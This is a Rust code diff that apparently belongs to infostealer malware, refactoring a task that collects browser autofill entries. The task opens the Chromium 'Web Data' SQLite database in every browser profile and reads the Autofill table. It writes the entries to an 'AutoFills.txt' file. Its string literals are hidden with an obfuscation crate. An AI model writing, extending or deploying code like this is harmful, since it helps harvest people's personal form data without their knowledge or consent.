@@ -1,12 +1,11 @@
-use database::TableRecord;
 use crate::alloc::borrow::ToOwned;
+use crate::chromium::BrowserData;
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, AutoFill};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
+use database::TableRecord;
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, AutoFill};
-use crate::chromium::BrowserData;
-use obfstr::obfstr as s;
 
 const AUTOFILL_NAME: usize           = 0;
 const AUTOFILL_VALUE: usize          = 1;
@@ -26,7 +25,12 @@ impl Task for AutoFillTask {
     parent_name!("AutoFills.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut autofills) = collect_from_all_profiles(&self.browser.profiles, read_autofills) else {
+        let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
+            &self.browser.profiles,
+            |profile| profile / s!("Web Data"),
+            s!("Autofill"),
+            extract_autofill_from_record
+        ) else {
             return
         };
 
@@ -35,11 +39,6 @@ impl Task for AutoFillTask {
 
         let _ = to_string_and_write_all(&autofills, "\n\n", parent);
     }
-}
-
-fn read_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
-    let web_data_path = profile / s!("Web Data");
-    read_sqlite3_and_map_records(&web_data_path, s!("Autofill"), extract_autofill_from_record)
 }
 
 fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
